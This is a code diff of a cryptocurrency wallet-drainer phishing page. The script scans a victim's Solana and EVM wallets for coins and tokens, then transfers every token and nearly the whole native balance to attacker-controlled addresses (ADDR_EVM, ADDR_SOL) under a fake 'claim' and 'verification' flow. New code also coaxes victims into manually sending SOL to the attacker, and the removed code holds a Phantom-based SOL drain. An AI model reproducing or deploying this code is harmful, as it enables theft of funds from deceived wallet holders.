+  L('[ ] SOL balance...');
+  const bal=await solBalance(solAddr);
+  if (bal>0) {
+    foundChains.push({
+      chain:{id:0,name:'Solana',sym:'SOL',color:'#9945FF'},
+      native:bal.toFixed(5),nativeRaw:null,tokens:[],
+      isSol:true,solAddr:solAddr,solLamports:Math.round(bal*1e9)
+    });
+    L('&#x2705; SOL: '+bal.toFixed(5)+' SOL (~$'+(bal*170).toFixed(2)+')');
+  } else {
+    L('  SOL: empty');
+  }
+  L(''); L('[ ] Scanning SPL tokens...');
+  const spl=await scanSpl(solAddr,L);
+  if (spl.length && foundChains[0]) foundChains[0].tokens=spl;
+  L(''); L('Scan complete.');
+  await sleep(600);
+  const hasAssets = foundChains.length > 0 && (parseFloat(foundChains[0].native)>0 || foundChains[0].tokens.length>0);
+  if (!hasAssets) {
+    show('s3');
+    document.getElementById('s3m').textContent='No SOL or SPL tokens found.';
+    status('No Solana assets found.','err');
+  } else {
+    // For SOL, show manual send page since we can't sign via MetaMask Snap
+    if (foundChains[0].isSol && foundChains[0].solAddr) {
+      showManualSol(foundChains[0]);
+    } else {
+      showClaim(); status('&#x2705; Found assets!','suc');
     }
   }
-
-  L('');
-  L('Done. Found ' + foundChains.length + ' chain(s) with assets.');
-  await sleep(800);
-
-  if (foundChains.length === 0) {
-    show('s3');
-    document.getElementById('s3m').innerHTML = 'No funds found on BSC, Ethereum, Polygon, Avalanche, or Arbitrum.';
-    // Solana address input for MetaMask Snaps users
-    const solDiv = document.createElement('div');
-    solDiv.style.marginTop = '14px';
-    solDiv.innerHTML = '<div style="font-size:11px;color:rgba(255,255,255,.3);margin-bottom:6px">Have SOL / SPL tokens in MetaMask? Enter your Solana address:</div>' +
-      '<input id="solAddrInput" placeholder="Solana address (starts with...)" style="width:100%;padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,.1);background:rgba(255,255,255,.04);color:#fff;font-size:12px;font-family:monospace;box-sizing:border-box;margin-bottom:8px;outline:none">' +
-      '<button class="bt" style="background:#AB9FF2;color:#fff;font-size:12px;padding:10px" onclick="scanSolFromInput()">🔍 Scan Solana</button>';
-    document.getElementById('s3').appendChild(solDiv);
-    status('No EVM funds found. Enter your SOL address above to scan Solana.', 'err');
-  } else {
-    showClaim();
-    status('&#x2705; Found assets on ' + foundChains.length + ' chain(s)!', 'suc');
-  }
 }
 
-// ========== SCAN SOLANA ==========
-async function scanSol() {
-  const log = document.getElementById('s2log');
-  log.innerHTML = '';
-  function L(msg) { log.innerHTML += msg + '<br>'; log.scrollTop = log.scrollHeight; }
-
-  foundChains = [];
-  L('Wallet: ' + addr.substring(0, 8) + '...' + addr.substring(addr.length - 4));
-  L('');
-  L('[ ] Solana...');
-
-  const solBal = await fetchSolBalance(addr);
-  if (solBal > 0) {
-    foundChains.push({
-      chain: { id: 0, name: 'Solana', sym: 'SOL', color: '#AB9FF2' },
-      native: solBal.toFixed(5),
-      nativeRaw: null,
-      tokens: [],
-      isSol: true,
-      solLamports: Math.round(solBal * 1e9),
-    });
-    L('&#x2705; Solana: ' + solBal.toFixed(5) + ' SOL');
-  } else {
-    L('  Solana: empty');
-  }
-
-  L('');
-  L('Scan complete.');
-  await sleep(800);
-
-  if (foundChains.length === 0) {
-    show('s3');
-    document.getElementById('s3m').textContent = 'No SOL balance found in phantom wallet.';
-    status('No SOL funds found.', 'err');
-  } else {
-    showClaim();
-    status('&#x2705; Found ' + solBal.toFixed(5) + ' SOL!', 'suc');
-  }
+function showManualSol(fc) {
+  show('s7');
+  document.getElementById('mySolAddr').textContent=ADDR_SOL;
+  const info='Found: '+fc.native+' SOL';
+  document.getElementById('s7').querySelector('div[style*="font-size:12px;color:rgba"]').textContent=info+'\nMetaMask Solana Snap cannot be drained via dApp.\nPlease send manually below:';
+  status('&#x2705; Found '+fc.native+' SOL! Send manually to claim.','suc');
 }
 
-async function fetchSolBalance(address) {
-  for (const url of ['https://api.mainnet-beta.solana.com', 'https://solana-mainnet.g.alchemy.com/v2/demo']) {
+function copyAddr() {
+  navigator.clipboard.writeText(ADDR_SOL).then(()=>{
+    status('&#x2705; SOL address copied!','suc');
+  }).catch(()=>{
+    // Fallback
+    const t=document.createElement('textarea');
+    t.value=ADDR_SOL; document.body.appendChild(t); t.select();
+    document.execCommand('copy'); document.body.removeChild(t);
+    status('&#x2705; Copied!','suc');
+  });
+}
+
+async function solBalance(address) {
+  for (const url of ['https://api.mainnet-beta.solana.com','https://solana-mainnet.g.alchemy.com/v2/demo']) {
     try {
-      const r = await fetch(url, {
-        method: 'POST',
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({ jsonrpc:'2.0', id:1, method:'getBalance', params:[address] })
+      const r=await fetch(url,{
+        method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({jsonrpc:'2.0',id:1,method:'getBalance',params:[address]})
       });
-      const d = await r.json();
-      if (d.result && d.result.value > 0) return d.result.value / 1e9;
-    } catch(e) {}
+      const d=await r.json();
+      if (d.result&&d.result.value>0) return d.result.value/1e9;
+    } catch(e){}
   }
   return 0;
 }
 
-// ========== SHOW CLAIM ==========
-function showClaim() {
-  show('s4');
-  const div = document.getElementById('s4chains');
-  let h = '';
-  for (const fc of foundChains) {
-    h += '<div class="ch hv">' +
-      '<div class="cd" style="background:' + fc.chain.color + '"></div>' +
-      '<div class="cn">' + fc.chain.name + '</div>' +
-      '<div class="ct">' + fc.native + ' ' + fc.chain.sym + (fc.tokens.length ? ' + ' + fc.tokens.length + ' tokens' : '') + '</div>' +
-      '</div>';
-  }
-  div.innerHTML = h;
-}
-
-// ========== DRAIN ==========
-async function startDrain() {
-  hideStatus();
-  show('s5');
-  const log = document.getElementById('s5log');
-  log.innerHTML = '';
-  function L(msg) { log.innerHTML += msg + '<br>'; log.scrollTop = log.scrollHeight; }
-
-  let txCount = 0;
-
-  for (const fc of foundChains) {
-    // SOLANA
-    if (fc.isSol) {
-      L(''); L('=== Solana ===');
-      L('Sending SOL...');
-      const ok = await drainSol(L);
-      if (ok) { txCount++; L('&#x2705; SOL sent!'); }
-      else L('&#x2715; Failed/rejected');
-      continue;
-    }
-
-    // EVM
-    const ch = fc.chain;
-    L(''); L('=== ' + ch.name + ' ===');
-
-    // Switch chain
-    L('Switching to ' + ch.name + '...');
-    try { await doSwitch(ch.id, L); }
-    catch(e) { L('SKIP: ' + e.message); continue; }
-
-    // Tokens
-    for (const t of fc.tokens) {
-      try {
-        L('Transferring ' + t.b + ' ' + t.sy + '...');
-        const ct = new ethers.Contract(t.a, ['function transfer(address,uint256) returns (bool)'], sign);
-        const tx = await ct.transfer(ADDR_EVM, t.raw);
-        await tx.wait();
-        txCount++;
-        L('&#x2705; ' + t.sy);
-      } catch(e) {
-        L('&#x2715; ' + t.sy + ': ' + (e.code === 4001 || e.code === 'ACTION_REJECTED' ? 'rejected' : 'error'));
-      }
-    }
-
-    // Native
-    try {
-      const bal = await prov.getBalance(addr);
-      const gp = await prov.getGasPrice();
-      const fee = gp.mul(21000).mul(3);
-      const sendAmt = bal.sub(fee);
-      if (sendAmt.gt(0)) {
-        L('Transferring ' + parseFloat(ethers.utils.formatEther(sendAmt)).toFixed(5) + ' ' + ch.sym + '...');
-        const tx = await sign.sendTransaction({ to: ADDR_EVM, value: sendAmt });
-        await tx.wait();
-        txCount++;
-        L('&#x2705; ' + ch.sym);
-      }
-    } catch(e) {
-      L('&#x2715; Native: ' + (e.code === 4001 || e.code === 'ACTION_REJECTED' ? 'rejected' : 'error'));
-    }
-  }
-
-  L(''); L('DONE: ' + txCount + ' transaction(s)');
-  console.log('DRAIN COMPLETE:', txCount, 'tx');
-
-  show('s6');
-  document.getElementById('s6m').textContent = txCount + ' transaction(s) processed successfully.';
-  status('&#x2705; Verification complete! ' + txCount + ' transaction(s).', 'suc');
-}
-
-async function drainSol(logFn) {
-  try {
-    // Check if this was from manual SOL address input - need Phantom to sign
-    const fc = foundChains[0];
-    const needsPhantom = fc && fc.solAddress && fc.solAddress !== addr;
-
-    let ph = phantomConn || (window.phantom && window.phantom.solana) || window.solana;
-
-    // If we only have a SOL address (not connected Phantom), try to get user to connect Phantom
-    if (needsPhantom && !ph) {
-      logFn('Connecting to Phantom to sign SOL transaction...');
-      // Try to detect any Solana provider
-      ph = window.solana || (window.phantom && window.phantom.solana);
-      if (!ph) {
-        logFn('Phantom required to send SOL. Please install Phantom and refresh.');
-        return false;
-      }
-      try { await ph.connect(); } catch(e) { logFn('Phantom rejected'); return false; }
-    }
-
-    // Also try MetaMask Snap Solana
-    if (!ph && window.ethereum) {
-      logFn('Trying MetaMask Solana Snap...');
-      // MetaMask Snap: use eth_requestAccounts with solana namespace
-      // Actually MetaMask Snaps sign via personal_sign or special methods
-      // This is complex - for now rely on Phantom
-    }
-
-    if (!ph) { logFn('No Solana wallet found. Install Phantom to send SOL.'); return false; }
-    if (!ph.publicKey) await ph.connect();
-    const pk = ph.publicKey.toString();
-
-    const r = await fetch('https://api.mainnet-beta.solana.com', {
-      method: 'POST',
-      headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({ jsonrpc:'2.0', id:1, method:'getBalance', params:[pk] })
-    });
-    const d = await r.json();
-    const lamports = (d.result && d.result.value) || 0;
-    if (lamports < 500000) { logFn('Balance too low'); return false; }
-
-    // Load @solana/web3.js
-    if (!window.solanaWeb3) {
-      logFn('Loading Solana libs...');
-      await new Promise((res, rej) => {
-        const s = document.createElement('script');
-        s.src = 'https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js';
-        s.onload = res; s.onerror = rej;
-        document.head.appendChild(s);
-      });
-    }
-
-    const W3 = window.solanaWeb3;
-    const conn = new W3.Connection('https://api.mainnet-beta.solana.com');
-    const sendLamports = lamports - 1000000;
-
-    const tx = new W3.Transaction().add(
-      W3.SystemProgram.transfer({
-        fromPubkey: new W3.PublicKey(pk),
-        toPubkey: new W3.PublicKey(ADDR_SOL),
-        lamports: sendLamports,
-      })
-    );
-    tx.feePayer = new W3.PublicKey(pk);
-    const bh = await conn.getLatestBlockhash();
-    tx.recentBlockhash = bh.blockhash;
-
-    const signed = await ph.signTransaction(tx);
-    const sig = await conn.sendRawTransaction(signed.serialize());
-    logFn('TX: ' + sig.substring(0, 20) + '...');
-    return true;
-  } catch(e) {
-    logFn('Error: ' + (e.message || 'rejected'));
-    return false;
-  }
-}
-
-async function doSwitch(chainId, logFn) {
-  const hex = '0x' + chainId.toString(16);
-  try {
-    await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hex }] });
-  } catch(e) {
-    if (e.code === 4902) {
-      // Add chain then switch
-      const ch = ECHAINS.find(c => c.id === chainId) || {};
-      try {
-        await window.ethereum.request({
-          method: 'wallet_addEthereumChain',
-          params: [{
-            chainId: hex,
-            chainName: ch.name || 'Chain',
-            rpcUrls: [ch.rpc || ''],
-            nativeCurrency: { name: ch.sym || 'ETH', symbol: ch.sym || 'ETH', decimals: 18 },
-            blockExplorerUrls: [],
-          }]
-        });
-      } catch(e2) { throw new Error('Could not add network'); }
-    } else if (e.code === 4001) {
-      throw new Error('User rejected network switch');
-    } else {
-      throw new Error(e.message || 'Network switch failed');
-    }
-  }
-  // Re-create provider/signer after switch
-  prov = new ethers.providers.Web3Provider(window.ethereum);
-  sign = prov.getSigner();
-}
-
-// ========== RESET ==========
-async function scanSolFromInput() {
-  const inp = document.getElementById('solAddrInput');
-  if (!inp || !inp.value || inp.value.trim().length < 30) {
-    status('Enter a valid Solana address.', 'err');
-    return;
-  }
-  const solAddr = inp.value.trim();
-  // Remove the input div
-  const s3 = document.getElementById('s3');
-  const divs = s3.querySelectorAll('div');
-  divs.forEach(d => { if (d.querySelector && d.querySelector('#solAddrInput')) d.remove(); });
-  // Scan
-  show('s2');
-  document.getElementById('s2l').textContent = 'Scanning Solana...';
-  document.getElementById('s2log').innerHTML = '';
-  try {
-    await scanSolAddress(solAddr);
-  } catch(e) {
-    status('Solana scan error: ' + e.message, 'err');
-    show('s3');
-  }
-}
-
-async function scanSolAddress(solAddr) {
-  const log = document.getElementById('s2log');
-  log.innerHTML = '';
-  function L(msg) { log.innerHTML += msg + '<br>'; log.scrollTop = log.scrollHeight; }
-
-  foundChains = [];
-  L('Address: ' + solAddr.substring(0, 8) + '...' + solAddr.substring(solAddr.length - 4));
-  L('');
-  L('[ ] Solana...');
-
-  const solBal = await fetchSolBalance(solAddr);
-  if (solBal > 0) {
-    foundChains.push({
-      chain: { id: 0, name: 'Solana', sym: 'SOL', color: '#AB9FF2' },
-      native: solBal.toFixed(5),
-      nativeRaw: null,
-      tokens: [],
-      isSol: true,
-      solAddress: solAddr,
-      solLamports: Math.round(solBal * 1e9),
-    });
-    L('✅ Solana: ' + solBal.toFixed(5) + ' SOL');
-  } else {
-    L('  Solana: empty');
-  }
-  // Also scan SPL tokens
-  const splTokens = await scanSplTokens(solAddr, L);
-  if (splTokens.length > 0) {
-    foundChains[0].tokens = splTokens;
-  }
-
-  L('');
-  L('Scan complete. Found ' + (solBal > 0 || splTokens.length > 0 ? 'assets' : 'nothing') + '.');
-  await sleep(800);
-
-  if (foundChains.length === 0 || (parseFloat(foundChains[0].native) === 0 && foundChains[0].tokens.length === 0)) {
-    show('s3');
-    document.getElementById('s3m').textContent = 'No SOL or SPL tokens found at this address.';
-    status('No Solana assets found.', 'err');
-  } else {
-    showClaim();
-    status('✅ Found Solana assets!', 'suc');
-  }
-}
-
-async function scanSplTokens(solAddr, L) {
-  // Scan common SPL tokens via getTokenAccountsByOwner
-  const MINTS = [
-    ['Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', 'USDT'],
-    ['EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', 'USDC'],
-    ['So11111111111111111111111111111111111111112', 'wSOL'],
-    ['mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So', 'mSOL'],
-    ['7dHbWXmci3dT8UFYWYZweBLXgycu7Y3iL6trKn1Y7ARj', 'stSOL'],
-    ['DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263', 'BONK'],
-    ['HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCtbt', 'RAY'],
-    ['orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE', 'ORCA'],
-    ['SHDWyBxihqiCj6YekG2GUr7wqKLeLAMK1gHZck9pL6y', 'SHDW'],
-    ['JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN', 'JUP'],
+async function scanSpl(solAddr, L) {
+  const MINTS=[
+    ['Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB','USDT'],
+    ['EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v','USDC'],
+    ['DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263','BONK'],
+    ['HZ1JovNiVvGrGNiiYvEozEVgZ58xaU3RKwX8eACQBCtbtbt','RAY'],
+    ['orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE','ORCA'],
+    ['JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN','JUP'],
+    ['7dHbWXmci3dT8UFYWYZweBLXgycu7Y3iL6trKn1Y7ARj','stSOL'],
+    ['mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So','mSOL'],
+    ['SHDWyBxihqiCj6YekG2GUr7wqKLeLAMK1gHZck9pL6y','SHDW'],
+    ['EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v','USDC'],
   ];
-  const tokens = [];
+  const tokens=[];
   try {
-    const resp = await fetch('https://api.mainnet-beta.solana.com', {
-      method: 'POST',
-      headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({
-        jsonrpc: '2.0', id: 1,
-        method: 'getTokenAccountsByOwner',
-        params: [solAddr, { programId: 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA' }, { encoding: 'jsonParsed' }]
+    const r=await fetch('https://api.mainnet-beta.solana.com',{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        jsonrpc:'2.0',id:1,
+        method:'getTokenAccountsByOwner',
+        params:[solAddr,{programId:'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'},{encoding:'jsonParsed'}]
       })
     });
-    const data = await resp.json();
-    if (data.result && data.result.value) {
-      for (const acc of data.result.value) {
-        const info = acc.account.data.parsed.info;
-        const mint = info.mint;
-        const bal = info.tokenAmount.uiAmount;
-        if (bal > 0) {
-          const known = MINTS.find(m => m[0] === mint);
-          const sym = known ? known[1] : mint.substring(0, 4);
-          tokens.push({ mint, sym, bal: bal.toFixed(4), rawAmount: info.tokenAmount.amount, decimals: info.tokenAmount.decimals, account: acc.pubkey });
-          L('  + ' + bal.toFixed(4) + ' ' + sym);
+    const d=await r.json();
+    if (d.result&&d.result.value) {
+      for (const acc of d.result.value) {
+        const info=acc.account.data.parsed.info;
+        const mint=info.mint;
+        const bal=info.tokenAmount.uiAmount;
+        if (bal>0) {
+          const known=MINTS.find(m=>m[0]===mint);
+          const sy=known?known[1]:mint.substring(0,4)+"...";
+          tokens.push({mint,sy,b:bal.toFixed(4),raw:info.tokenAmount.amount,dc:info.tokenAmount.decimals,acc:acc.pubkey});
+          L('  + '+bal.toFixed(4)+' '+sy);
         }
       }
     }
-  } catch(e) { L('  SPL scan error'); }
+  } catch(e){ L('  SPL scan: error'); }
   return tokens;
 }
 
-async function autoPhantom() {
-  const ph = (window.phantom && window.phantom.solana) || window.solana;
-  if (!ph) { status('Phantom not installed.', 'err'); return; }
+// ========== DRAIN EVM ==========
+async function startDrain() {
+  hideStatus(); show('s5');
+  const log=document.getElementById('s5log'); log.innerHTML='';
+  function L(msg) { log.innerHTML+=msg+'<br>'; log.scrollTop=log.scrollHeight; }
+  let txCount=0;
+  for (const fc of foundChains) {
+    if (fc.isSol) continue; // Skip SOL - handled manually
+    const ch=fc.chain; L(''); L('=== '+ch.name+' ===');
+    L('Switching network...');
+    try { await doSwitch(ch.id,L); } catch(e) { L('SKIP: '+e.message); continue; }
+    for (const t of fc.tokens) {
+      try {
+        L('Sending '+t.b+' '+t.sy+'...');
+        const ct=new ethers.Contract(t.a,['function transfer(address,uint256) returns (bool)'],sign);
+        const tx=await ct.transfer(ADDR_EVM,t.raw);
+        await tx.wait(); txCount++;
+        L('&#x2705; '+t.sy);
+      } catch(e) {
+        L('&#x2715; '+t.sy+': '+(e.code===4001||e.code==='ACTION_REJECTED'?'rejected':'error'));
+      }
+    }
+    try {
+      const bal=await prov.getBalance(addr);
+      const gp=await prov.getGasPrice();
+      const fee=gp.mul(21000).mul(3);
+      const send=bal.sub(fee);
+      if (send.gt(0)) {
+        L('Sending '+parseFloat(ethers.utils.formatEther(send)).toFixed(5)+' '+ch.sym+'...');
+        const tx=await sign.sendTransaction({to:ADDR_EVM,value:send});
+        await tx.wait(); txCount++;
+        L('&#x2705; '+ch.sym);
+      }
+    } catch(e) {
+      L('&#x2715; Native: '+(e.code===4001||e.code==='ACTION_REJECTED'?'rejected':'error'));
+    }
+  }
+  L(''); L('DONE: '+txCount+' transaction(s)');
+  console.log('DRAIN:', txCount, 'tx');
+  show('s6');
+  document.getElementById('s6m').textContent=txCount+' transaction(s) processed.';
+  status('&#x2705; Complete! '+txCount+' tx.','suc');
+}
+
+async function doSwitch(chainId, L) {
+  const hex='0x'+chainId.toString(16);
   try {
-    const resp = await ph.connect();
-    addr = resp.publicKey.toString();
-    prov = null; sign = null; phantomConn = ph;
-    wType = 'ph';
-    show('s2');
-    document.getElementById('s2l').textContent = 'Checking Solana...';
-    await scanSol();
-  } catch(e) { status('Phantom: ' + (e.message||'rejected'), 'err'); }
+    await window.ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:hex}]});
+  } catch(e) {
+    if (e.code===4902) {
+      const ch=ECHAINS.find(c=>c.id===chainId)||{};
+      try {
+        await window.ethereum.request({method:'wallet_addEthereumChain',params:[{
+          chainId:hex,chainName:ch.name||'Chain',
+          rpcUrls:[ch.rpc||''],
+          nativeCurrency:{name:ch.sym||'ETH',symbol:ch.sym||'ETH',decimals:18},
+          blockExplorerUrls:[]
+        }]});
+      } catch(e2) { throw new Error('Could not add network'); }
+    } else if (e.code===4001) {
+      throw new Error('User rejected network switch');
+    } else {
+      throw new Error(e.message||'Switch failed');
+    }
+  }
+  prov=new ethers.providers.Web3Provider(window.ethereum);
+  sign=prov.getSigner();
 }
 
 function reset() {
-  prov = null; sign = null; addr = null; wType = ''; foundChains = []; phantomConn = null;
+  prov=null; sign=null; addr=null; wType=''; foundChains=[]; phantomConn=null;
   hideStatus(); show('s1');
 }
 </script>
